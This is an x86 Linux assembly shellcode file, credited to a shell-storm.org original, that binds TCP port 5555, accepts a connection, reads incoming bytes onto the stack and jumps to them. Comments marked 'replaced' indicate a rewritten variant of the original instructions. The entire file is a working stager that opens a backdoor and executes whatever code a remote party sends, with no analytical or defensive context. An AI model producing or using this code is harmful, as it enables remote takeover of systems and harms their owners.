	; original: http://shell-storm.org/shellcode/files/shellcode-501.php
	; linux/x86 listens for shellcode on tcp/5555 and jumps to it 83 bytes
	; length 94
	section .text
global _start

_start:
	sub eax, eax	; replaced
	imul ebx, eax	; replaced
	imul edx, eax	; replaced

_socket:
	push 0x6	; proto?
	push 0x1
	push 0x2
	add al, 0x66	; replaced
	add bl, 1	; replaced
	lea ecx, [esp] ; replaced
	int 0x80

_bind:
	mov edi, eax	; placing descriptor
	push edx
	push WORD 0xb315	;/* 5555 */
	push WORD 2
	lea ecx, [esp]	; replaced
	push 16
	push ecx
	push edi
	xor eax, eax	; replaced
	add al, 0x66	; replaced
	add bl, 1	; replaced
	lea ecx, [esp]	; replaced
	int 0x80

_listen:
	mov bl, 4	; replaced
	push 0x1
	push edi
	add al, 0x66	; replaced
	lea ecx, [esp]	; replaced
	int 0x80

_accept:
	push edx
	push edx
	push edi
	add al, 0x66	; replaced
	mov bl, 5	; replaced
	lea ecx, [esp]	; replaced
	int 0x80
	mov ebx, eax

_read:
	mov al, 0x3
	lea ecx, [esp]	; replaced
	mov dx, 0x7ff
	mov dl, 1	; replaced
	int 0x80
	jmp esp
